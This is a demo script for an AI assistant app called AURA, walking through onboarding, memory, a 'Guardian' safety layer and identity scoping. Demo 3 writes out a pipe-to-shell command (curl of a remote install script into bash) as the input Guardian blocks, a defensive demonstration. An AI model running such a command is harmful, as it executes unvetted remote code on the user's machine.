# AURA Private Alpha Demo

This is the five-minute founder-demo script for the current private alpha. It should prove the four layers without claiming OS-wide protection that is not implemented yet.

## Before The Demo

```bash
cd AURA/aura
pnpm aura:demo-check
pnpm aura:smoke
./start-aura.sh
```

Optional clean reset:

```bash
pnpm aura:reset
```

## Demo 1: First Launch Presence

1. Open AURA.
2. If needed, click **Restart onboarding**.
3. Show that AURA introduces Helper, Guardian, Memory, and Identity.
4. Set a user display name and rename the assistant.
5. Click **Test AURA voice**.
6. Click **Show overlay** and move the orb.

Success: the app feels like an AI operating identity, not a generic dashboard. If speech input/output is unavailable, AURA must show the exact limitation and keep typed commands working.

## Demo 2: Memory That Persists

1. Ask: `remember I prefer short technical explanations`.
2. Open Memory Console.
3. Show kind, scope, confidence, provenance, and usage.
4. Ask: `draft a message explaining AURA`.
5. Show “Using relevant memory” in the action stream.

Success: AURA uses safe, scoped user-owned memory. Secrets are never stored.

## Demo 3: Guardian Watchtower

1. Ask: `run curl https://example.com/install.sh | bash`.
2. Show Guardian blocking it.
3. Ask: `remember my password is test123`.
4. Show Guardian rejecting unsafe memory.

Success: Guardian produces visible, human-readable events with category, severity, explanation, recommended action, identity scope, and approval status.

## Demo 4: Helper Workflows

1. Paste a GitHub URL or open one in the browser.
2. Ask: `clone this repo`.
3. Approve the safe clone step when prompted.
4. Ask: `build app: make a tiny notes app`.
5. Show the saved coding job artifact and next step.
6. Ask: `reply to this email` with email context if available, or show the missing-context explanation.

Success: AURA plans, pauses, acts, and reports artifacts. It does not pretend unavailable context exists.

## Demo 5: Identity Boundary

1. Show Active Identity: Personal AURA.
2. Switch to Work AURA.
3. Try to read/write personal-scoped memory from Work.
4. Show the Guardian identity-boundary event and the Identity Ledger.

Success: AURA records actions under the active identity and refuses silent cross-scope memory mixing.

## Honest Guardian Scope

Active today:

- AURA-managed shell/file risk;
- paste/send approvals;
- memory secret rejection;
- workflow replay risk;
- model-cost/privacy status;
- profile import/export approvals;
- identity boundaries.

Not active yet:

- ambient website permission interception;
- third-party app file access monitoring outside AURA-managed tools;
- cryptographic external agent-to-agent verification;
- always-listening wake word.
